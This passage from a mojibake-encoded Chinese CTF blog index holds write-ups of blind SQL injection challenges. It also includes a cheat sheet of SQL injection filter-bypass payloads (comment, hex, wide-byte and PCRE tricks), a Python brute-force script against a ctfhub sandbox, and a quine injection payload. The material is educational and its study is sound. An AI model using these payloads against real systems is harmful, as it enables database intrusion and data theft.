where table_schema=database() limit 1,1),4,1)='g'\n#query_success\n#å½“å‰åº“sqliçš„ç¬¬äºŒå¼ è¡¨è¡¨åçš„ç¬¬å››ä¸ªå­—ç¬¦æ˜¯g\n\n#å½“å‰åº“sqliæœ‰ä¸¤å¼ è¡¨â€™newsâ€˜å’Œâ€˜flagâ€™\n```\n\n6. å¯¹è¡¨çˆ†åˆ—æ•°é‡\n\n```sql\n?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name='flag')=1\n#query_error\n\n?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name='flag')=2\n#query_success\n#å½“å‰åº“sqliè¡¨flagçš„åˆ—æ•°ä¸º2\n```\n\n7. æ ¹æ®è¡¨åå’Œåˆ—æ•°é‡çˆ†åˆ—åé•¿åº¦\n\n```sql\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1)=1\n#query_error\n...\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1)=4\n#query_success\n#å½“å‰åº“sqliè¡¨flagçš„ç¬¬ä¸€åˆ—åˆ—åé•¿åº¦ä¸º4\n...\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1)=4\n#query_success\n#å½“å‰åº“sqliè¡¨flagçš„ç¬¬äºŒåˆ—åˆ—åé•¿åº¦ä¸º4\n\n#å½“å‰åº“sqliè¡¨flagæœ‰ä¸¤ä¸ªåˆ—â€˜idâ€™å’Œâ€˜flagâ€™ï¼Œåˆ—åé•¿åº¦ä¸º2å’Œ4\n\n```\n\n8. æ ¹æ®åˆ—åé•¿åº¦çˆ†åˆ—å\n\n```sql\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,1)='a'\n#query_error\n...\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,1)='i'\n#query_success\n#å½“å‰åº“sqliè¡¨flagçš„ç¬¬ä¸€åˆ—åˆ—åç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºi\n...\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1,1),4,1)='g'\n#query_success\n#å½“å‰åº“sqliè¡¨flagçš„ç¬¬äºŒåˆ—åˆ—åç¬¬å››ä¸ªå­—ç¬¦ä¸ºg\n\n#å½“å‰åº“sqliè¡¨flagæœ‰ä¸¤ä¸ªåˆ—â€˜idâ€™å’Œâ€˜flagâ€™\n```\n\n9. æ ¹æ®åˆ—åçˆ†æ•°æ®\n\n```sql\n?id=1 and substr((select flag from sqli.flag),1ï¼Œ1)=â€œaâ€\n#query_error\n...\n?id=1 and substr((select flag from sqli.flag),1ï¼Œ1)=â€œcâ€\n#query_success\n#flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯c\n...\n?id=1 and substr((select flag from sqli.flag),iï¼Œ1)=â€œ}â€\n#query_success\n#flagçš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯}\n#è¿™é‡Œçš„jæ˜¯è®¡æ•°å˜é‡jä»1è‡ªå¢1å¾—åˆ°çš„å€¼\n\n#å‡ºå¾ªç¯å³å¯å¾—åˆ°flag\n```\n\n### ä¾‹é¢˜3ï¼šæ—¶é—´ç›²æ³¨(ctfhub)\n\næ—¶é—´ç›²æ³¨å’Œä¸Šä¸€ç¯‡å¸ƒå°”ç›²æ³¨ä¸€æ ·éƒ½æ˜¯ç›²æ³¨ï¼Œéƒ½éœ€è¦å€ŸåŠ©`length`,`ascii`,`substr`è¿™äº›ç¥å¥‡çš„å‡½æ•°æ¥çŒœæµ‹å„é¡¹ä¿¡æ¯ã€‚å®ƒä»¬çš„å·®åˆ«æ˜¯çŒœæµ‹æˆåŠŸçš„ä¾æ®ã€‚\n\nå¸ƒå°”ç›²æ³¨çš„è¯å¦‚æœæŸ¥è¯¢æœ‰ç»“æœï¼Œä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ª`success_flag`,æ¯”å¦‚åœ¨ä¸Šä¸€é¢˜é‡Œå°±ä¼šè¿”å›`query successfully`ã€‚\n\nä½†æ˜¯æ—¶é—´ç›²æ³¨ä¸ä¸€æ ·ï¼Œå®ƒä¸å…‰ä¸ç»™ä½ æŸ¥è¯¢çš„å†…å®¹çš„å›æ˜¾ï¼Œä¸ç»™ä½ æŠ¥é”™ä¿¡æ¯ï¼Œç”šè‡³è¿å¸ƒå°”ç›²æ³¨é‡Œçš„`success_flag`ä¹Ÿä¸ç»™ã€‚\næ—¶é—´ç›²æ³¨ç›¸å½“äºè‡ªè¡Œåˆ›é€ å‡ºäº†ä¸€ä¸ª`success_flag`ï¼Œå°†æŸ¥è¯¢æˆåŠŸçš„æƒ…å†µä¸æŸ¥è¯¢å¤±è´¥çš„æƒ…å†µåšäº†åŒºåˆ†ã€‚\n\n> `substr(str,from,length)`:è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚**å…¶ä¸­ï¼Œé¦–å­—ç¬¦ä¸‹æ ‡ä¸º1**\n\n1. é¦–å…ˆçˆ†ç ´æ•°æ®åº“é•¿åº¦\n\n```sql\n1 and if(length(database())=4,sleep(3),1)\n```\n\n![image-20230717201555815](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201555815.png)\n\n2.  çˆ†ç ´æ•°æ®åº“åå­— \n\n```sql\n1 and if(ascii(substr(database(),1,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),1,1))=115,sleep(3),1)\tascii(s)=115\n\n1 and if(ascii(substr(database(),2,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),2,1))=113,sleep(3),1)\tascii(q)=113\n\n1 and if(ascii(substr(database(),3,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),3,1))=108,sleep(3),1)\tascii(l)=108\n\n1 and if(ascii(substr(database(),4,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),4,1))=105,sleep(3),1)\tascii(i)=105\n\n......\nä¸æ–­è°ƒæ•´ASCIIç çš„èŒƒå›´é€æ¸å¾—åˆ°æ•°æ®åº“åç§°ä¸ºsqli\n```\n\n![image-20230717201850243](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201850243.png)\n\n3. çˆ†ç ´æ•°æ®åº“ä¸­è¡¨çš„æ•°é‡\n\n```sql\n1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)\n```\n\n![image-20230717202031447](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202031447.png)\n\n4. çˆ†ç ´æ•°æ®åº“ä¸­çš„å„è¡¨å\n\n```sql\n1 and if(ascii(substr((select table_name from information_schema.tables\n  where table_schema=database() limit 0,1),1,1))=110,sleep(3),1)\n  ascii(n)=110\n\n3ç§’åå“åº”ï¼Œè¯´æ˜ç¬¬ä¸€å¼ è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºn\nä¾æ¬¡å¾—åˆ°è¡¨åä¸ºnews\nlimit i,1  i è¡¨ç¤ºçš„å³æ˜¯ç¬¬å‡ å¼ è¡¨\n\n1 and if(ascii(substr((select table_name from information_schema.tables\n  where table_schema=database() limit 1,1),1,1))=102,sleep(3),1)\n  ascii(f)=102\n\n3ç§’åå“åº”ï¼Œè¯´æ˜ç¬¬äºŒå¼ è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºf\nä¾æ¬¡å¾—åˆ°è¡¨åä¸ºflag\n```\n\n![image-20230717202404932](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202404932.png)\n\n5. çˆ†ç ´flagè¡¨çš„å­—æ®µæ•°\n\n```sql\n1 and if((select count(column_name) from information_schema.columns where table_name='flag')=1,sleep(3),1)\n```\n\n6. çŒœè§£å­—æ®µå \n\n```sql\n1 and if(ascii(substr((select column_name from information_schema.columns where table_name='flag'),1,1))=102,sleep(3),1)\n\nä¸€æ ·çš„å¥—è·¯ï¼Œå¾—åˆ°å­—æ®µåä¸ºflag\n```\n\n","tags":["æ‰‹å·¥æ³¨å…¥","æŠ¥é”™æ³¨å…¥","å¸ƒå°”ç›²æ³¨","æ—¶é—´ç›²æ³¨","ctfhub"],"categories":["Web"]},{"title":"sqlæ³¨å…¥ç»•è¿‡æŠ€å·§","url":"/sqlæ³¨å…¥ç»•è¿‡æŠ€å·§/","content":"\n# sqlæ³¨å…¥ç»•è¿‡æŠ€å·§\n\n## 1.ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦/* */ï¼Œ%a0ï¼‰ï¼š\n\nã€€ã€€`ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ï¼Œ%a0=ç©ºæ ¼ï¼š`\n\n```sql\n%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\n```\n\n æœ€åŸºæœ¬çš„ç»•è¿‡æ–¹æ³•ï¼Œç”¨æ³¨é‡Šæ›¿æ¢ç©ºæ ¼ï¼š\n\n```sql\n/*  æ³¨é‡Š */\n```\n\n![image-20230719194920907](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230719194920907.png)\n\nä½¿ç”¨æµ®ç‚¹æ•°ï¼š\n\n```sql\nselect * from users where id=8E0union select 1,2,3\nselect * from users where id=8.0 select 1,2,3\n```\n\n## 2.æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼š\n\nã€€ã€€å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ‹¬å·ç»•è¿‡ã€‚\n\nã€€ã€€åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚\n\nä¾‹å¦‚ï¼š\n\n```sql\nselect(user())from dual where(1=1)and(2=2)\n```\n\nã€€ã€€è¿™ç§è¿‡æ»¤æ–¹æ³•å¸¸å¸¸ç”¨äºtime basedç›²æ³¨,ä¾‹å¦‚ï¼š\n\n```sql\n?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23\n```\n\nï¼ˆfrom forå±äºé€—å·ç»•è¿‡ä¸‹é¢ä¼šæœ‰ï¼‰\n\nã€€ã€€ä¸Šé¢çš„æ–¹æ³•æ—¢æ²¡æœ‰é€—å·ä¹Ÿæ²¡æœ‰ç©ºæ ¼ã€‚çŒœè§£databaseï¼ˆï¼‰ç¬¬ä¸€ä¸ªå­—ç¬¦asciiç æ˜¯å¦ä¸º109ï¼Œè‹¥æ˜¯åˆ™åŠ è½½å»¶æ—¶ã€‚\n\n## 3.å¼•å·ç»•è¿‡ï¼ˆä½¿ç”¨åå…­è¿›åˆ¶ï¼‰\n\nã€€ã€€ä¼šä½¿ç”¨åˆ°å¼•å·çš„åœ°æ–¹ä¸€èˆ¬æ˜¯åœ¨æœ€åçš„`where`å­å¥ä¸­ã€‚å¦‚ä¸‹é¢çš„ä¸€æ¡sqlè¯­å¥ï¼Œè¿™æ¡è¯­å¥å°±æ˜¯ä¸€ä¸ªç®€å•çš„ç”¨æ¥æŸ¥é€‰å¾—åˆ°usersè¡¨ä¸­æ‰€æœ‰å­—æ®µçš„ä¸€æ¡è¯­å¥ï¼š\n\n```sql\nselect column_name  from information_schema.tables where table_name=\"users\"\n```\n\nã€€ã€€è¿™ä¸ªæ—¶å€™å¦‚æœå¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆä¸Šé¢çš„`where`å­å¥å°±æ— æ³•ä½¿ç”¨äº†ã€‚é‚£ä¹ˆé‡åˆ°è¿™æ ·çš„é—®é¢˜å°±è¦ä½¿ç”¨**åå…­è¿›åˆ¶**æ¥å¤„ç†è¿™ä¸ªé—®é¢˜äº†ã€‚\n`ã€€ã€€users`çš„åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²æ˜¯`7573657273`ã€‚é‚£ä¹ˆæœ€åçš„sqlè¯­å¥å°±å˜ä¸ºäº†ï¼š\n\n```sql\nselect column_name  from information_schema.tables where table_name=0x7573657273\n```\n\n## 4.é€—å·ç»•è¿‡ï¼ˆä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼š\n\nã€€ã€€åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limitã€‚è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨`from to`çš„æ–¹å¼æ¥è§£å†³ï¼š\n\n```sql\nselect substr(database() from 1 for 1);\nselect mid(database() from 1 for 1);\n```\n\nã€€ã€€ä½¿ç”¨joinï¼š\n\n```sql\nunion select 1,2     #ç­‰ä»·äº\nunion select * from (select 1)a join (select 2)b\n```\n\nã€€ã€€ä½¿ç”¨likeï¼š\n\n```sql\nselect ascii(mid(user(),1,1))=80   #ç­‰ä»·äº\nselect user() like 'r%'\n```\n\nã€€ã€€å¯¹äº`limit`å¯ä»¥ä½¿ç”¨`offset`æ¥ç»•è¿‡ï¼š\n\n```sql\nselect * from news limit 0,1\n# ç­‰ä»·äºä¸‹é¢è¿™æ¡SQLè¯­å¥\nselect * from news limit 1 offset 0\n```\n\n## 5.æ¯”è¾ƒç¬¦å·ï¼ˆ<>ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†<>ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨<>ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š\n\n### ä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰\n\nã€€åŒæ ·æ˜¯åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°`greatest`æ¥è¿›è¡Œç»•è¿‡äº†ã€‚\nã€€ã€€æœ€å¸¸è§çš„ä¸€ä¸ªç›²æ³¨çš„sqlè¯­å¥ï¼š\n\n```sql\nselect * from users where id=1 and ascii(substr(database(),0,1))>64\n```\n\nã€€ã€€æ­¤æ—¶å¦‚æœæ¯”è¾ƒæ“ä½œç¬¦è¢«è¿‡æ»¤ï¼Œä¸Šé¢çš„ç›²æ³¨è¯­å¥åˆ™æ— æ³•ä½¿ç”¨,é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨`greatest`æ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦äº†ã€‚greatest(n1,n2,n3,...)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,...)çš„æœ€å¤§å€¼ã€‚\nã€€ã€€é‚£ä¹ˆä¸Šé¢çš„è¿™æ¡sqlè¯­å¥å¯ä»¥ä½¿ç”¨`greatest`å˜ä¸ºå¦‚ä¸‹çš„å­å¥:\n\n```sql\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n```\n\n### ä½¿ç”¨between andï¼š \n\n  between a and bï¼š\n\nbetween 1 and 1; ç­‰ä»·äº =1\n\n## 6.or and xor notç»•è¿‡ï¼š\n\n```sql\nand=&&  or=||   xor=|   not=!\n```\n\n## 7.ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼Œ--(åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š\n\n```sql\nid=1' union select 1,2,3||'1\n```\n\nã€€ã€€æœ€åçš„or '1é—­åˆæŸ¥è¯¢è¯­å¥çš„æœ€åçš„å•å¼•å·ï¼Œæˆ–è€…ï¼š\n\n```sql\nid=1' union select 1,2,'3\n```\n\n## 8.=ç»•è¿‡ï¼š\n\nã€€ã€€ä½¿ç”¨like ã€rlike ã€regexp æˆ–è€… ä½¿ç”¨< æˆ–è€… >\n\n## 9.ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰ï¼š\n\n### ï¼ˆ1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼š\n\nã€€ã€€å¸¸ç”¨æ³¨é‡Šç¬¦ï¼š\n\n```sql\n//ï¼Œ-- , /**/, #, --+, -- -, ;,%00,--a\n```\n\nã€€ã€€ç”¨æ³•ï¼š\n\n```sql\nU/**/ NION /**/ SE/**/ LECT /**/userï¼Œpwd from user\n```\n\n### ï¼ˆ2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼š\n\n```sql\nid=-1'UnIoN/**/SeLeCT\n```\n\n### ï¼ˆ3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼š\n\n```sql\nid=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n```\n\n### ï¼ˆ4ï¼‰ åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„unionå°±èƒ½ç»•è¿‡ï¼‰ï¼š\n\n```sql\nid=-1'UNIunionONSeLselectECT1,2,3â€“-\n```\n\n## 10.é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰ï¼š\n\nã€€ã€€å¦‚URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡ï¼š\n\n```sql\nor 1=1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)ã€‚\n```\n\n## 11.ç­‰ä»·å‡½æ•°ç»•è¿‡ï¼š\n\n```sql\nhex()ã€bin() ==> ascii()\n\nsleep() ==>benchmark()\n\nconcat_ws()==>group_concat()\n\nmid()ã€substr() ==> substring()\n\n@@user ==> user()\n\n@@datadir ==> datadir()\n\nä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74ã€€\n\næˆ–è€…ï¼š\nsubstr((select 'password'),1,1) = 0x70\nstrcmp(left('password',1), 0x69) = 1\nstrcmp(left('password',1), 0x70) = 0\nstrcmp(left('password',1), 0x71) = -1\n```\n\n## 12.å®½å­—èŠ‚æ³¨å…¥ï¼š\n\nã€€ã€€è¿‡æ»¤ ' çš„æ—¶å€™å¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°† ' è½¬æ¢ä¸º \\' ã€‚\n\nã€€ã€€åœ¨ mysql ä¸­ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š\n\nã€€ã€€ï¼ˆ1ï¼‰%df åƒæ‰ \\ å…·ä½“çš„æ–¹æ³•æ˜¯ urlencode('\\) = %5c%27ï¼Œæˆ‘ä»¬åœ¨ %5c%27 å‰é¢æ·»åŠ  %df ï¼Œå½¢æˆ %df%5c%27 ï¼Œè€Œ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œ%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ï¼ˆ'ï¼‰ç¬¦å·åœ¨å¤–é¢ï¼š\n\n```sql\nid=-1%df%27union select 1,user(),3--+\n```\n\nã€€ã€€ï¼ˆ2ï¼‰å°† \\' ä¸­çš„ \\ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 ï¼Œåé¢çš„ %5c ä¼šè¢«å‰é¢çš„ %5c æ³¨é‡Šæ‰ã€‚\n\n### ä¸€èˆ¬äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥çš„PHPå‡½æ•°ï¼š\n\n  1.replaceï¼ˆï¼‰ï¼šè¿‡æ»¤ ' \\ ï¼Œå°† ' è½¬åŒ–ä¸º \\' ï¼Œå°† \\  è½¬ä¸º \\\\ï¼Œå°† \" è½¬ä¸º \\\" ã€‚ç”¨æ€è·¯ä¸€ã€‚\n\n  2.addslaches()ï¼šè¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ ï¼ˆ\\ï¼‰çš„å­—ç¬¦ä¸²ã€‚é¢„å®šä¹‰å­—ç¬¦ï¼š' , \" , \\ ã€‚ç”¨æ€è·¯ä¸€\n\nï¼ˆé˜²å¾¡æ­¤æ¼æ´ï¼Œè¦å°† mysql_query è®¾ç½®ä¸º binary çš„æ–¹å¼ï¼‰\n\nã€€ ã€€3.mysql_real_escape_string()ï¼šè½¬ä¹‰ä¸‹åˆ—å­—ç¬¦ï¼š\n\n```sql\n\\x00     \\n     \\r     \\     '     \"     \\x1a\n```\n\nï¼ˆé˜²å¾¡ï¼Œå°†mysqlè®¾ç½®ä¸ºgbkå³å¯ï¼‰\n\n## PCREç»•è¿‡ï¼š\n\n```sql\nunion/*'+'a'*1000001+'*/select\n```\n\n# \n","tags":["sqlæ³¨å…¥","ç»•è¿‡"],"categories":["Web"]},{"title":"yet_another_mysql_injection","url":"/yet-another-mysql-injection/","content":"\n# 2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injection\n\n1. åˆå§‹ç•Œé¢\n\n![image-20230801194529159](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png)\n\næŸ¥çœ‹æºä»£ç å‘ç°æºç æ–‡ä»¶  **/?source**\n\n```php\n<?php\ninclude_once(\"lib.php\");\nfunction alertMes($mes,$url){\n    die(\"<script>alert('{$mes}');location.href='{$url}';</script>\");\n}\n\nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag|=|>|<|and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n\nif (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {\n    $username=$_POST['username'];\n    $password=$_POST['password'];\n    if ($username !== 'admin') {\n        alertMes('only admin can login', 'index.php');\n    }\n    checkSql($password);\n    $sql=\"SELECT password FROM users WHERE username='admin' and password='$password';\";\n    $user_result=mysqli_query($con,$sql);\n    $row = mysqli_fetch_array($user_result);\n    if (!$row) {\n        alertMes(\"something wrong\",'index.php');\n    }\n    if ($row['password'] === $password) {\n    die($FLAG);\n    } else {\n    alertMes(\"wrong password\",'index.php');\n  }\n}\n\nif(isset($_GET['source'])){\n  show_source(__FILE__);\n  die;\n}\n?>\n```\n\n2. æºç åˆ†æ\n\n- `alertMes($mes, $url)`ï¼šè¯¥å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œ`$mes`ï¼ˆè¦æ˜¾ç¤ºçš„æ¶ˆæ¯ï¼‰å’Œ`$url`ï¼ˆæ˜¾ç¤ºæ¶ˆæ¯åè¦é‡å®šå‘çš„URLï¼‰ã€‚å®ƒä½¿ç”¨JavaScriptè¾“å‡ºä¸€ä¸ªåŒ…å«ç»™å®šæ¶ˆæ¯çš„è­¦å‘Šå¼¹çª—ï¼Œç„¶åå°†ç”¨æˆ·é‡å®šå‘åˆ°æŒ‡å®šçš„URLã€‚\n- `checkSql($s)`ï¼šè¯¥å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°`$s`ï¼ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼Œå¹¶æ£€æŸ¥å…¶ä¸­æ˜¯å¦åŒ…å«ä»»ä½•å¯ç–‘çš„SQLå…³é”®è¯æˆ–å­—ç¬¦ï¼Œè¿™å¯èƒ½è¡¨æ˜è¯•å›¾è¿›è¡ŒSQLæ³¨å…¥æ”»å‡»ã€‚å¦‚æœå‘ç°ä»»ä½•å¯ç–‘å…³é”®è¯æˆ–å­—ç¬¦ï¼Œå®ƒå°†ä½¿ç”¨`alertMes`å‡½æ•°æ˜¾ç¤ºè­¦å‘Šï¼Œå¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ° \"index.php\"ã€‚\n\n\n\n```php\nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag| =| >|< |and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n```\n\n- æ¨¡å¼åˆ†éš”ç¬¦åçš„\"i\"æ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢\n\n```bash\nsleep å¯ä»¥ç”¨benchmarkä»£æ›¿\n<,> å¯ä»¥ç”¨least(),greatest()ä»£æ›¿\n=,in å¯ä»¥ç”¨likeä»£æ›¿\nsubstr å¯ä»¥ç”¨midä»£æ›¿\nç©ºæ ¼ å¯ä»¥ç”¨/**/ä»£æ›¿\n```\n\n3. æ³¨å…¥è„šæœ¬æµ‹è¯•\n\n```python\nimport requests\nimport time\n\nchar = '01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&%'\n\n\ndef password():\n    flag = ''\n    url = 'http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php'\n    while True:\n        for i in char:\n            payload = {\"username\": \"admin\",\n                       \"password\": f\"1'or/**/password/**/like/**/'{flag + i}%'#\"\n                       }\n            # print(payload)\n            res = requests.post(url=url, data=payload)\n\n            if \"something wrong\" not in res.text:\n                flag += i\n                print(flag)\n                break\n            if \"ctfhub\" in res.text:\n                print(\"game over\")\n                break\n            elif \"~\" in i:\n                print(\"just ok\")\n                return\n\n\nif __name__ == '__main__':\n    password()\n\n```\n\n**è¿è¡Œç»“æœ `o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok`**\n\né€šè¿‡`ç”¨æˆ·å admin` `å¯†ç  o2cqmlyo0kpjkdyocm8cfbygzaievxbw` ç™»å½• è¿˜æ˜¯æ˜¾ç¤ºé”™è¯¯ \n\n4. é€šè¿‡ç½‘ä¸Šwriteup å‘ç°\n\nä½¿ç”¨äº† **quineæ³¨å…¥**\n\n**1.é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹replace()å‡½æ•°**\n\n- replace(object,search,replace)\n- æŠŠobjectå¯¹è±¡ä¸­å‡ºç°çš„çš„searchå…¨éƒ¨æ›¿æ¢æˆreplace\n\næ³¨å…¥çš„payload:\n\n```sql\n1'/**/union/**/select/**/\nreplace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#\n```\n\n`CHAR(34)=\"       CHAR(39)='        CHAR(33)=!         char(46)=.`\n\n## quineæ³¨å…¥\n\n> æ ¸å¿ƒæ€æƒ³ï¼š\n>\n> sqlè¯­å¥æ‰§è¡Œçš„ç»“æœç­‰äºsqlè¯­å¥æœ¬èº«\n\nå³åˆ©ç”¨sqlæ‰§è¡Œçš„ç»“æœç­‰äºå®ƒæœ¬èº«ç»•è¿‡åˆ¤æ–­ï¼š\n\n$row['password'] === $password\n\n```sql\n1' union select replace(replace('1\" union select replace(replace(\".\",\",') ,., \".\")#',\", '), ., '1 union select replace(replace(\".\", \",'), ., \".\")#')#\n```\n\n","tags":["web","sqlæ³¨å…¥"],"categories":["CTF","ctfhub"]},{"title":"find_it","url":"/find-it/","content":"\n# 2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it\n\n![image-20230730102906291](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730102906291-1691288556204-1.png)\n\n1. é¦–å…ˆè¿›é¡¹ç«¯å£æ‰«æ`dirsearch`\n\n![image-20230730103550756](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103550756-1691288556205-2.png)\n\n![image-20230730103615203](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103615203-1691288556205-3.png)\n\n1. robots.txt æ–‡ä»¶å†…å®¹\n\n![image-20230730103720699](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103720699-1691288556205-4.png)\n\n1. 